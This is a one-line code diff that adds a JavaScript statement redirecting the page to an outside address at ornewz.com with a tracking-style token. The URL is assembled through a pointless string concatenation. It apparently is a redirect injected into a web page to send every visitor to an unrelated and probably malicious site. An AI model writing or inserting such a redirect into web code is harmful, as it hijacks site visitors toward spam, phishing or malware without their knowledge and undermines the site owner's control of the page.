@@ -1,0 +1,1 @@
+window.location.replace(``.concat(`http://ornewz.com/rd/c34056sKVkl0CRzO14Zks0qzlU303`))
